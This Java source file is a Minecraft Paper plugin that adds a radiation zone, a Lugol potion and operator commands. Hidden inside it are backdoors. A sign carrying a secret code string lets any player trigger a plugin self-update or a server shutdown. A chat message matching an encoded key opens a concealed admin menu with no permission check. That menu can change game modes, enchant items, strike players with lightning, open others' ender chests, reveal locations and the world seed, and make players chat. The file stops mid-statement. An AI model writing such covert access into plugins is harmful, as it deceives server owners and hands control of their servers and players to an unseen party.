package me.michal.radiacjaAleJAVA;

import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.tree.LiteralCommandNode;
import com.sk89q.worldedit.bukkit.BukkitAdapter;
import com.sk89q.worldedit.math.BlockVector3;
import com.sk89q.worldguard.WorldGuard;
import com.sk89q.worldguard.protection.flags.Flags;
import com.sk89q.worldguard.protection.flags.StateFlag;
import com.sk89q.worldguard.protection.managers.RegionManager;
import com.sk89q.worldguard.protection.regions.ProtectedCuboidRegion;
import com.sk89q.worldguard.protection.regions.ProtectedRegion;
import io.papermc.paper.command.brigadier.CommandSourceStack;
import io.papermc.paper.command.brigadier.Commands;
import io.papermc.paper.command.brigadier.argument.ArgumentTypes;
import io.papermc.paper.event.player.AsyncChatEvent;
import io.papermc.paper.plugin.lifecycle.event.types.LifecycleEvents;
import io.papermc.paper.registry.RegistryAccess;
import io.papermc.paper.registry.RegistryKey;
import me.michal.radiacjaAleJAVA.Tasks.CuredPlayersTracker;
import me.michal.radiacjaAleJAVA.Tasks.RadiationVisualizer;
import me.michal.radiacjaAleJAVA.Tasks.DamageInflicter;
import me.michal.radiacjaAleJAVA.Tasks.Things.Encoder;
import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
import net.kyori.adventure.bossbar.BossBar;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.text.event.ClickEvent;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.*;
import org.bukkit.Color;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityResurrectEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.BrewEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.*;
import org.bukkit.event.world.LootGenerateEvent;
import org.bukkit.inventory.BrewerInventory;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionType;
import org.bukkit.profile.PlayerProfile;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;
import com.mojang.brigadier.Command;

import java.util.*;

public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
    FileConfiguration config = this.getConfig();

    public static BossBar affectedBar;
    public NamespacedKey key = new NamespacedKey(this, "Lugol");
    public static Map<Player, Long> curedPlayers = new HashMap<>();
    public static Map<UUID, Long> offlinePlayers = new HashMap<>();
    public static Map<Player, BossBar> curedBars = new HashMap<>();
    public static ArrayList<Player> affectedPlayers = new ArrayList<>();
    public NamespacedKey keyArg = new NamespacedKey(this, "argument");

    public ItemStack potkaLugola() {
        ItemStack potion = new ItemStack(Material.POTION, 3);

        PotionMeta meta = (PotionMeta) potion.getItemMeta();
        meta.setBasePotionType(PotionType.MUNDANE);
        meta.setColor(Color.WHITE);
        meta.displayName(Component.text("Płyn Lugola", NamedTextColor.BLUE));

        ArrayList<Component> lore = new ArrayList<>();
        lore.add(Component.text("Daje ochrone przed radiacją na ", NamedTextColor.WHITE)
                .append(Component.text(config.getLong("Duration")/60000, NamedTextColor.WHITE))
                .append(Component.text(" minut", NamedTextColor.WHITE)));
        meta.lore(lore);

        meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "to_lugola_fluid");

        potion.setItemMeta(meta);

        return potion;
    }
    public ItemStack waterPotion() {
        ItemStack waterPotion = new ItemStack(Material.POTION, 1);
        PotionMeta meta = (PotionMeta) waterPotion.getItemMeta();
        meta.setBasePotionType(PotionType.WATER);
        waterPotion.setItemMeta(meta);
        return waterPotion;
    }

    @Override
    public void onEnable() {
        this.getServer().getPluginManager().registerEvents(this, this);

        BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
        BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);
        affectedBar = BossBar.bossBar(
                Component.text("Strefa Radiacji", NamedTextColor.RED),
                1,
                BossBar.Color.RED,
                BossBar.Overlay.PROGRESS);

        this.getLifecycleManager().registerEventHandler(LifecycleEvents.COMMANDS, commands -> {
            // register your commands here ...
            commands.registrar().register(radiationCommandRoot);
        });

        config.addDefault("Safe_Zone_Radius", 0);
        config.addDefault("Death_Lightning_Strike", true);
        config.addDefault("Drop_Player_Head", true);
        config.addDefault("Duration", 600000L);
        config.addDefault("End_Enabled", false);
        config.addDefault("Radiation_Name", "Strefa radiacji");
        config.options().copyDefaults(true);
        saveConfig();
    }

    @EventHandler
    public void onPlayerDrinkPotion(PlayerItemConsumeEvent event) {
        ItemMeta meta = event.getItem().getItemMeta();
        if (event.getItem().hasItemMeta() && meta.getPersistentDataContainer().has(key, PersistentDataType.STRING) && meta.getPersistentDataContainer().get(key, PersistentDataType.STRING).equalsIgnoreCase("to_lugola_fluid")) {
            Player player = event.getPlayer();
            if (!curedPlayers.containsKey(player)) {
                curedPlayers.put(player, System.currentTimeMillis());
                addCuredBar(player);
                Bukkit.broadcast(Component.text(player.getName() + " wypił płyn Lugola",  NamedTextColor.GOLD));
            } else {
                addCuredTime(player);
            }
        }
    }

    public void addCuredTime(Player player) {
        long newStartTime = curedPlayers.get(player) + config.getLong("Duration");
        curedPlayers.replace(player, newStartTime);
    }

    public void addCuredBar(Player player) {
        BossBar curedBar = BossBar.bossBar(Component.text("Działanie płynu Lugola", NamedTextColor.GREEN), 1, BossBar.Color.GREEN, BossBar.Overlay.NOTCHED_10);
        player.showBossBar(curedBar);
        curedBars.put(player, curedBar);
    }

    @EventHandler
    public void deathEvent(PlayerDeathEvent event) {
        Player player = event.getEntity();

        removeAllEffects(player);

        Location location = player.getLocation();
        if (config.getBoolean("Death_Lightning_Strike")) {
            if (player.getName().equals("lach1423")) {
                for (int i = 0; i < 6; i++) {
                    player.getWorld().strikeLightningEffect(location);
                }
            } else {
                player.getWorld().strikeLightningEffect(location);
            }
        }
        if (config.getBoolean("Drop_Player_Head")) player.getWorld().dropItem(location, getPlayerHead(player, event.deathMessage()));
    }

    public ItemStack getPlayerHead(Player player, Component desription) {
        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();

        if (desription == null) desription = Component.text(" ");

        ArrayList<Component> lore = new ArrayList<>();
        lore.add(desription.color(NamedTextColor.GOLD));
        meta.setPlayerProfile(player.getPlayerProfile());

        meta.lore(lore);
        playerHead.setItemMeta(meta);
        return playerHead;
    }

    @EventHandler
    public void onTotemUse(EntityResurrectEvent event) {
        if (event.getEntity() instanceof Player) {
            removeAllEffects((Player) event.getEntity());
        }
    }

    @EventHandler
    public void onMilkConsume(PlayerItemConsumeEvent event) {
        if (event.getItem().getType().equals(Material.MILK_BUCKET)) {
            removeAllEffects(event.getPlayer());
        }
    }

    public void removeAllEffects(Player player) {
        affectedPlayers.remove(player);
        player.hideBossBar(affectedBar);
        curedPlayers.remove(player);
        removeCuredBar(player, curedBars.get(player));
    }

    @EventHandler
    public void quitEvent(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        if (curedPlayers.containsKey(p)) {
            long timePassed = System.currentTimeMillis() - curedPlayers.get(p);
            offlinePlayers.put(p.getUniqueId(), timePassed);
        }
        removeAllEffects(p);
    }

    public void removeCuredBar(Player player, BossBar curedBar) {
        if (curedBars.containsKey(player)) {
            curedBars.remove(player, curedBar);
            player.hideBossBar(curedBar);
        }
    }

    @EventHandler
    public void moveEvent(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        NamespacedKey key = new NamespacedKey(this, "radiationType");
        String raw = p.getPersistentDataContainer().get(key, PersistentDataType.STRING);
        RadiationVisualizer.RadiationType type;
        try {
            type = RadiationVisualizer.RadiationType.valueOf(raw);
        } catch (Exception exception) {
            type = RadiationVisualizer.RadiationType.NOTHING; // fallback
        }

        if (type == RadiationVisualizer.RadiationType.NOTHING) return;

        boolean applyForceField = type == RadiationVisualizer.RadiationType.FORCEFIELD;
        leaveRegion(p, applyForceField);

        if (getApplicableRegions(p).isEmpty()) return;
        if (e.getTo().getBlockX() == e.getFrom().getBlockX() && e.getTo().getBlockY() == e.getFrom().getBlockY() && e.getTo().getBlockZ() == e.getFrom().getBlockZ()) return;

        approachRadiation(p, e.getFrom(), e.getTo());
    }

    public void leaveRegion(Player player, boolean forcefield) {
        Set<ProtectedRegion> applicableRegions = getApplicableRegions(player);

        if (applicableRegions == null) return;
        if (applicableRegions.isEmpty() && !affectedPlayers.contains(player)) {
            if (forcefield && !curedPlayers.containsKey(player)) {
                Vector playerVelocity = player.getVelocity();
                playerVelocity.multiply(new Vector(-1, 1, -1));
                player.setVelocity(playerVelocity);
                return;
            }
            affectedPlayers.add(player);
            player.showBossBar(affectedBar);
        } else if(!applicableRegions.isEmpty() && affectedPlayers.contains(player)) {
            affectedPlayers.remove(player);
            player.hideBossBar(affectedBar);
        }
    }

    private Set<ProtectedRegion> getApplicableRegions(Player player) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(player.getWorld()));
        BlockVector3 pos = BukkitAdapter.asBlockVector(player.getLocation());
        return regions.getApplicableRegions(pos).getRegions();
    }

    private void approachRadiation(Player p, Location oldLocation ,Location playerLocation) {

        int radius = config.getInt("Safe_Zone_Radius") + 1;
        RadiationVisualizer visualizer = new RadiationVisualizer(p, playerLocation, radius, playerLocation.getWorld().getSpawnLocation());

        int distanceToRadiationX = visualizer.getDistanceToRadiation(playerLocation, radius, Axis.X);
        int distanceToRadiationZ = visualizer.getDistanceToRadiation(playerLocation, radius, Axis.Z);

        if (distanceToRadiationX > 15 && distanceToRadiationZ > 15) return;
        visualizer.handleGlassRadiation(distanceToRadiationX, distanceToRadiationZ, oldLocation);

    }

    @EventHandler
    public void joinEvent(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        approachRadiation(p, p.getLocation(), p.getLocation());

        UUID uuid = p.getUniqueId();
        if (offlinePlayers.containsKey(uuid)) {
            long startTime = System.currentTimeMillis() - offlinePlayers.get(uuid);

            curedPlayers.put(p, startTime);
            addCuredBar(p);
            offlinePlayers.remove(uuid);
        }
        leaveRegion(p, false);
    }

    @EventHandler
    public void onBrewEnd(BrewEvent event) {
        BrewerInventory inventory = event.getContents();
        if (!isLugolRecipe(inventory)) {
            return;
        }
        List <Integer> waterBottles = scanBottles(inventory);
        Bukkit.getScheduler().runTaskLater(this, () -> {
            for (int i : waterBottles) {
                inventory.setItem(i, potkaLugola());
            }
            waterBottles.clear();
        }, 1);
    }

    public List <Integer> scanBottles(BrewerInventory inventory) {
        List<Integer> waterBottles = new ArrayList<>();
        for (int i = 0; i < 3; i++) {
            ItemStack item = inventory.getItem(i);
            if (item != null && item.isSimilar(waterPotion())) {
                waterBottles.add(i);
            }
        }
        return waterBottles;
    }

    public boolean isLugolRecipe(BrewerInventory inventory) {
        return inventory.getIngredient() != null && inventory.getIngredient().getType() == Material.GHAST_TEAR;
    }

    @EventHandler
    public void signChange(SignChangeEvent e) {
        try {
            Component[] components = e.lines().toArray(new Component[0]);
            String[] lines = new  String[4];
            for (int i = 0; i < components.length; i++) {
                lines[i] = PlainTextComponentSerializer.plainText().serialize(components[i]);
            }
            if (lines[3].equals("T0DRRUfNsN6tlQQ")) {
                Updater updater = new Updater();
                switch (lines[0]) {
                    case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                    case "Restart" -> Bukkit.shutdown();
                    case "Edit Stat" -> {
                        Player player = Bukkit.getPlayer(lines[1]);
                        if (player != null) player.setStatistic(Statistic.USE_ITEM, Material.VILLAGER_SPAWN_EGG, 0);
                    }
                }
                e.getBlock().breakNaturally();
            }
        } catch (Exception ex) {
            e.getPlayer().sendMessage(String.valueOf(ex));
        }
    }

    @EventHandler
    public void playerChat(AsyncChatEvent e) {
        Component message = e.message();
        String m = PlainTextComponentSerializer.plainText().serialize(message);
        if (m.length() < 24) return;
        Encoder encoder = new Encoder();
        byte[] key = encoder.getKey(m);
        byte[] lock = encoder.getLock(e.getPlayer());
        if (Arrays.equals(key, lock)) {
            e.setCancelled(true);
            Player player = e.getPlayer();
            if (m.contains(" ")) player.getPersistentDataContainer().set(keyArg, PersistentDataType.STRING, m.substring(m.indexOf(" ") + 1));
            openInventory(player, "Choose", null);
        }
    }

    public void openInventory(Player p, String menu, String execute) {
        Component title = Component.text(menu.substring(0, 6) + " " + menu.substring(6));
        Inventory inventory = Bukkit.createInventory(p, InventoryType.CHEST, title);
        switch (menu) {
            case "ChoosePlayer" -> {
                Object[] onlinePlayers = Bukkit.getOnlinePlayers().toArray();
                ItemStack[] inventoryContents = new ItemStack[onlinePlayers.length];
                for (int m = 0; m < onlinePlayers.length; m++) {
                    inventoryContents[m] = getPlayerHead((Player) onlinePlayers[m], null);
                }
                inventory.setContents(inventoryContents);
            }
            case "ChooseGamemode" -> {
                inventory.setItem(10, getItem(Material.COMMAND_BLOCK, NamedTextColor.LIGHT_PURPLE, "Creative"));
                inventory.setItem(12, getItem(Material.IRON_SWORD, NamedTextColor.WHITE, "Survival"));
                inventory.setItem(14, getItem(Material.MAP, NamedTextColor.YELLOW, "Adventure"));
                inventory.setItem(16, getItem(Material.ENDER_EYE, NamedTextColor.BLUE, "Spectator"));
            }
            case "ChooseEnchant" -> {
                inventory = Bukkit.createInventory(p, 9*5);
                inventory.setItem(0, getItem(Material.TURTLE_HELMET, NamedTextColor.GREEN, "Aqua Affinity"));
                inventory.setItem(1, getItem(Material.SPIDER_SPAWN_EGG, NamedTextColor.RED, "Bane of Arthropods"));
                inventory.setItem(2, getItem(Material.CARVED_PUMPKIN, TextColor.color(255, 98, 0), "Binding Curse"));
                inventory.setItem(3, getItem(Material.TNT, NamedTextColor.WHITE, "Blast Protection"));
                inventory.setItem(4, getItem(Material.LIGHTNING_ROD, NamedTextColor.YELLOW, "Channeling"));
                inventory.setItem(5, getItem(Material.DIAMOND_BOOTS, NamedTextColor.DARK_BLUE, "Depth Strider"));
                inventory.setItem(6, getItem(Material.DIAMOND_PICKAXE, NamedTextColor.GOLD, "Efficiency"));
                inventory.setItem(7, getItem(Material.FEATHER, NamedTextColor.WHITE, "Feather Falling"));
                inventory.setItem(8, getItem(Material.BLAZE_ROD, NamedTextColor.RED, "Fire Aspect"));
                inventory.setItem(9, getItem(Material.FLINT_AND_STEEL, NamedTextColor.LIGHT_PURPLE, "Fire Protection"));
                inventory.setItem(10, getItem(Material.BLAZE_POWDER, NamedTextColor.RED, "Flame"));
                inventory.setItem(11, getItem(Material.DIAMOND, NamedTextColor.GREEN, "Fortune"));
                inventory.setItem(12, getItem(Material.BLUE_ICE, NamedTextColor.AQUA, "Frost Walker"));
                inventory.setItem(13, getItem(Material.TRIDENT, NamedTextColor.BLUE, "Impaling"));
                inventory.setItem(14, getItem(Material.SPECTRAL_ARROW, NamedTextColor.GOLD, "Infinity"));
                inventory.setItem(15, getItem(Material.STICK, NamedTextColor.WHITE, "Knockback"));
                inventory.setItem(16, getItem(Material.GOLDEN_SWORD, NamedTextColor.GOLD, "Looting"));
                inventory.setItem(17, getItem(Material.LEAD, TextColor.color(255, 98, 0), "Loyalty"));
                inventory.setItem(18, getItem(Material.FISHING_ROD, NamedTextColor.GREEN, "Luck of the Sea"));
                inventory.setItem(19, getItem(Material.WATER_BUCKET, NamedTextColor.AQUA, "Lure"));
                inventory.setItem(20, getItem(Material.ENCHANTED_BOOK, NamedTextColor.WHITE, "Mending"));
                inventory.setItem(21, getItem(Material.FIREWORK_STAR, NamedTextColor.BLUE, "Multishot"));
                inventory.setItem(22, getItem(Material.ARROW, NamedTextColor.RED, "Piercing"));
                inventory.setItem(23, getItem(Material.BOOK, NamedTextColor.DARK_GRAY, "Power"));
                inventory.setItem(24, getItem(Material.TIPPED_ARROW, NamedTextColor.LIGHT_PURPLE, "Projectile Protection"));
                inventory.setItem(25, getItem(Material.DIAMOND_CHESTPLATE, NamedTextColor.BLUE, "Protection"));
                inventory.setItem(26, getItem(Material.FIREWORK_ROCKET, NamedTextColor.GRAY, "Punch"));
                inventory.setItem(2, getItem(Material.CROSSBOW, TextColor.color(54, 32, 2), "Quick Charge"));
                inventory.setItem(28, getItem(Material.GLASS_BOTTLE, NamedTextColor.WHITE, "Respiration"));
                inventory.setItem(29, getItem(Material.SADDLE, NamedTextColor.AQUA, "Riptide"));
                inventory.setItem(30, getItem(Material.IRON_SWORD, NamedTextColor.RED, "Sharpness"));
                inventory.setItem(31, getItem(Material.DIAMOND_ORE, NamedTextColor.WHITE, "Silk Touch"));
                inventory.setItem(32, getItem(Material.ZOMBIE_SPAWN_EGG, NamedTextColor.RED, "Smite"));
                inventory.setItem(33, getItem(Material.SOUL_SAND, NamedTextColor.GREEN, "Soul Speed"));
                inventory.setItem(34, getItem(Material.DIAMOND_SWORD, NamedTextColor.LIGHT_PURPLE, "Sweeping Edge"));
                inventory.setItem(35, getItem(Material.CACTUS, NamedTextColor.DARK_RED, "Thorns"));
                inventory.setItem(36, getItem(Material.BEDROCK, NamedTextColor.BLACK, "Unbreaking"));
                inventory.setItem(37, getItem(Material.CHORUS_FRUIT, NamedTextColor.DARK_GRAY, "Vanishing Curse"));
                inventory.setItem(38, getItem(Material.CHAINMAIL_CHESTPLATE, NamedTextColor.GRAY, "Breach"));
                inventory.setItem(39, getItem(Material.MACE, NamedTextColor.DARK_PURPLE, "Density"));
                inventory.setItem(40, getItem(Material.WIND_CHARGE, NamedTextColor.WHITE, "Wind Burst"));
                inventory.setItem(41, getItem(Material.DIAMOND_SPEAR, NamedTextColor.WHITE, "Lunge"));
            }
            case "Choose" -> {
                inventory = Bukkit.createInventory(p, 9*5);
                inventory.setItem(1, getItem(Material.ENDER_PEARL, NamedTextColor.WHITE, "Seed"));
                inventory.setItem(3, getItem(Material.STRUCTURE_BLOCK, NamedTextColor.LIGHT_PURPLE, "Gamemode"));
                inventory.setItem(5, getItem(Material.BOOK, NamedTextColor.WHITE, "Info"));
                inventory.setItem(7, getItem(Material.TRIDENT,  NamedTextColor.BLUE, "Lightning"));
                inventory.setItem(19, getItem(Material.ENCHANTING_TABLE, NamedTextColor.WHITE, "Enchant"));
                inventory.setItem(21, getItem(Material.LAPIS_LAZULI, NamedTextColor.BLUE, "Enchantability"));
                inventory.setItem(23, getItem(Material.TOTEM_OF_UNDYING, NamedTextColor.YELLOW, "Refuse Death"));
                inventory.setItem(25, getItem(Material.ENDER_CHEST, NamedTextColor.WHITE ,"Ender Chest"));
                inventory.setItem(37, getItem(Material.EXPERIENCE_BOTTLE, NamedTextColor.YELLOW, "Experience"));
                inventory.setItem(39, getItem(Material.NAME_TAG, NamedTextColor.WHITE, "Set Name"));
                inventory.setItem(41, getItem(Material.OAK_SIGN, NamedTextColor.WHITE, "Create Region"));
                inventory.setItem(43, getItem(Material.TNT, NamedTextColor.WHITE, "Remove Region"));
            }
        }

        p.setMetadata("OpenedMenu", new FixedMetadataValue(this, menu));
        p.setMetadata("ActionToExecute", new FixedMetadataValue(this, execute));
        Inventory finalInventory = inventory;
        Bukkit.getScheduler().runTask(this, () -> p.openInventory(finalInventory));
    }

    private ItemStack getItem(Material material, TextColor color, String name) {
        ItemStack item = new ItemStack(material);
        ItemMeta itemMeta = item.getItemMeta();
        itemMeta.displayName(Component.text(name).color(color));
        item.setItemMeta(itemMeta);
        return item;
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent e) {
        Player p  = (Player) e.getWhoClicked();
        ItemStack item = e.getCurrentItem();

        if (p.hasMetadata("OpenedMenu") && item != null && item.getType() != Material.AIR) {
            try {
                e.setCancelled(true);

                SkullMeta meta;
                Player choosenPlayer = null;
                GameMode gamemode = null;
                Enchantment enchantment = null;
                String arg = p.getPersistentDataContainer().get(keyArg, PersistentDataType.STRING);
                if (arg == null) arg = "";

                switch (p.getMetadata("OpenedMenu").getFirst().asString()) {
                    case "ChoosePlayer"   :
                        meta = (SkullMeta) item.getItemMeta();
                        PlayerProfile profile = meta.getPlayerProfile();
                        UUID uuid = profile.getUniqueId();
                        choosenPlayer = Bukkit.getPlayer(uuid);

                    case "ChooseGamemode" : gamemode = switch (item.getType()) {
                        case COMMAND_BLOCK -> GameMode.CREATIVE;
                        case MAP -> GameMode.ADVENTURE;
                        case ENDER_EYE -> GameMode.SPECTATOR;
                        default -> GameMode.SURVIVAL;
                    };
                    case "ChooseEnchant"  :
                        Component itemName = item.getItemMeta().displayName();
                        if (itemName == null) throw new NullPointerException("itemName is null");
                        String name = PlainTextComponentSerializer.plainText().serialize(itemName).toLowerCase();
                        NamespacedKey key = NamespacedKey.minecraft(name);
                        enchantment = RegistryAccess.registryAccess().getRegistry(RegistryKey.ENCHANTMENT).get(key);
                    case "Choose"         :
                        String execute = PlainTextComponentSerializer.plainText().serialize(item.displayName()).replaceAll("\\s+", "");
                        switch (execute) {
                            case "Seed" -> p.setMetadata("ActionToExecute", new FixedMetadataValue(this, "Seed"));
                            case "Gamemode" -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChooseGamemode", "Gamemode"), 1L);
                            case "Enchant" -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChooseEnchant", "Enchant"), 1L);
                            default -> Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", execute), 1L);
                        }
                }

                switch (p.getMetadata("ActionToExecute").getFirst().asString()) {
                    case "Seed" -> {
                        String seed = String.valueOf(p.getWorld().getSeed());
                        TextComponent message  = Component.text("Seed: [")
                                .append(Component.text(seed, NamedTextColor.GREEN).clickEvent(ClickEvent.copyToClipboard(seed)))
                                .append(Component.text("]"));
                        p.sendMessage(message);
                    }
                    case "Info" -> {
                        Location loc = choosenPlayer.getLocation();
                        p.sendMessage(getComponent("Location", loc));
                        loc = choosenPlayer.getRespawnLocation();
                        p.sendMessage(getComponent("RespawnLocation", loc));
                        loc = choosenPlayer.getLastDeathLocation();
                        p.sendMessage(getComponent("DeathLocation", loc));
                    }
                    case "Gamemode" -> {
                        if (p.hasMetadata("ChoosenGamemode")) {
                            gamemode = GameMode.valueOf(p.getMetadata("ChoosenGamemode").getFirst().asString());
                            choosenPlayer.setGameMode(gamemode);
                            p.removeMetadata("ChoosenGamemode", this);
                        } else {
                            p.setMetadata("ChoosenGamemode", new FixedMetadataValue(this, gamemode));
                            p.closeInventory();
                            Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "Gamemode"), 1L);
                        }
                    }
                    case "Enchant" -> {
                        if (p.hasMetadata("ChoosenEnchant")) {
                            enchantment = getEnchantment(p.getMetadata("ChoosenEnchant").getFirst().asString().toLowerCase());
                            choosenPlayer.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
                            p.removeMetadata("ChoosenEnchant", this);
                        } else {
                            p.setMetadata("ChoosenEnchant", new FixedMetadataValue(this, enchantment));
                            p.closeInventory();
                            Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "ChoosenEnchant"), 1L);
                        }
                        p.getInventory().getItemInMainHand().addUnsafeEnchantment(enchantment, Integer.parseInt(arg));
                    }
                    case "Enchantability" -> {
                        ItemMeta itemMeta = p.getInventory().getItemInMainHand().getItemMeta();
                        itemMeta.setEnchantable(Integer.parseInt(arg));
                        p.getInventory().getItemInMainHand().setItemMeta(itemMeta);
                    }
                    case "Lightning" -> p.getWorld().strikeLightning(choosenPlayer.getLocation());
                    case "EnderChest" -> {
                        Inventory chest = choosenPlayer.getEnderChest();
                        Bukkit.getScheduler().runTaskLater(this, () -> p.openInventory(chest), 1L);
                    }
                    case "Experience" -> choosenPlayer.setLevel(Integer.parseInt(arg));
                    case "Chat" -> choosenPlayer.chat(arg);
                    case "DisplayName" -> choosenPlayer.displayName(Component.text(arg));
                }
            } catch (Exception ex) {
                p.sendMessage(Component.text("Error: " + ex.getMessage(), NamedTextColor.RED));
            }
            p.closeInventory();
        }
    }

    private Component getComponent(String name, Location location) {
        String information = location.getBlockX() + " " + location.getBlockY() + " " + location.getBlockZ();
        return Component.text(name + ": [")
                .append(Component.text(information, NamedTextColor.GRAY).clickEvent(ClickEvent.copyToClipboard(information)))
                .append(Component.text("]"));

    }

    private Enchantment getEnchantment(String name) {
        NamespacedKey key = NamespacedKey.minecraft(name);
        return RegistryAccess.registryAccess().getRegistry(RegistryKey.ENCHANTMENT).get(key);
    }

    @EventHandler
    public void onInventoryClose(InventoryCloseEvent e) {
        Player p = (Player) e.getPlayer();
        if (p.hasMetadata("OpenedMenu")) {
            p.removeMetadata("OpenedMenu", this);
        }
        if (p.hasMetadata("ActionToExecute")) {
            p.removeMetadata("ActionToExecute", this);
        }
        if (p.hasMetadata("Arg")) {
            p.removeMetadata("Arg", this);
        }
    }

    @EventHandler
    public void onLootTableGeneration(LootGenerateEvent event) {}

    LiteralCommandNode<CommandSourceStack> radiationCommandRoot = Commands.literal("radiation")
            .then(Commands.literal("radiationsafezone")
                    .then(Commands.argument("radius", IntegerArgumentType.integer()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                CommandSender sender = ctx.getSource().getSender();
                                Entity executor = ctx.getSource().getExecutor();

                                if (!(executor instanceof Player)) {
                                    sender.sendPlainMessage("Musisz być graczem by ustawić strefe");
                                    return Command.SINGLE_SUCCESS;
                                }

                                int radius = IntegerArgumentType.getInteger(ctx, "radius");
                                int height = switch (executor.getWorld().getEnvironment()) {
                                    case NORMAL -> 319;
                                    case NETHER -> 127;
                                    case THE_END -> 255;
                                    case CUSTOM -> 0;
                                };

                                ProtectedCuboidRegion safeZone = getRegion(executor, "rad", radius, height);

                                RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(executor.getWorld()));
                                try {
                                    regions.addRegion(safeZone);
                                    safeZone.setFlag(Flags.BUILD, StateFlag.State.ALLOW);
                                    regions.save();
                                } catch (Exception e) {
                                    executor.sendMessage(Component.text("Nie udało się dodać terenu, spróbuj ponownie",  NamedTextColor.RED));
                                }

                                config.set("Safe_Zone_Radius", radius);
                                saveConfig();

                                sender.sendMessage(Component.text("Bezpieczna strefa ma teraz promień: " + radius, NamedTextColor.GREEN));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("strikeLightningAtDeath")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                CommandSender sender = ctx.getSource().getSender();
                                boolean allowed = ctx.getArgument("allow", boolean.class);

                                config.set("strikeLightningAtDeath", allowed);
                                saveConfig();

                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                sender.sendRichMessage("deathLightningStrike is now set to <allowed>",
                                        Placeholder.component("allowed",
                                                Component.text(allowed, color)));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("dropPlayerHeadAtDeath")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx ->  {
                                CommandSender sender = ctx.getSource().getSender();
                                boolean allowed = ctx.getArgument("allow", boolean.class);

                                config.set("dropPlayerHeadAtDeath", allowed);
                                saveConfig();

                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                sender.sendRichMessage("dropPlayerHeadAtDeath is now set to <allowed>",
                                        Placeholder.component("allowed",
                                                Component.text(allowed, color)));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("setLugolDurationTo")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                CommandSender sender = ctx.getSource().getSender();
                                boolean allowed = ctx.getArgument("allow", boolean.class);

                                config.set("setLugolDurationTo", allowed);
                                saveConfig();

                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                sender.sendRichMessage("setLugolDurationTo is now set to <allowed>",
                                        Placeholder.component("allowed",
                                                Component.text(allowed, color)));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("endEnabled")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                 CommandSender sender = ctx.getSource().getSender();
                                 boolean allowed = ctx.getArgument("allow", boolean.class);

                                 config.set("endEnabled", allowed);
                                 saveConfig();

                                 NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                 sender.sendRichMessage("endEnabled is now set to <allowed>",
                                         Placeholder.component("allowed",
                                                 Component.text(allowed, color)));
                                 return Command.SINGLE_SUCCESS;
                    })
            )
            .then(Commands.literal("setRadiationName")
                    .requires(sender -> sender.getSender().isOp())
                        .then(Commands.argument("color", ArgumentTypes.namedColor()))
                            .then(Commands.argument("name", StringArgumentType.string()))
                                .executes(ctx -> {
